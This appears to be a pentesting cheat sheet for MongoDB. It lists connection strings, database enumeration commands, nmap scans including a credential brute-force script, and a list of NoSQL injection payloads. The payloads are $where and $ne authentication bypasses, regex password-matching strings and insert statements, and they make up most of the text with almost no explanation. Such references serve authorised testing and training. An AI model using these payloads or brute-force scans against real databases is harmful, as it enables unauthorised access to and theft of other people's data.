# MongoDB

## Connection
```bash
mongo -u <username> -p <password> <auth_source>
# OR
mongo "mongodb://USERNAME:PASSWORD@IP:PORT/SOURCE?mechanism=DEFAULT&authSource=SOURCE"
mongo "mongodb://HOST:PORT"
```


## Enumeration
### MongoDB commands
```
show dbs
use <db>
show collections
db.<collection>.find()
db.<collection>.count()
db.current.find({"username":"admin"})
```

### nmap
```bash
nmap -sV --script "mongo* and default" -p 27017 <IP>

# Check if credentials are needed
nmap -n -sV --script mongodb-brute -p 27017 <IP>
```

## Payloads for SQLi
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true
```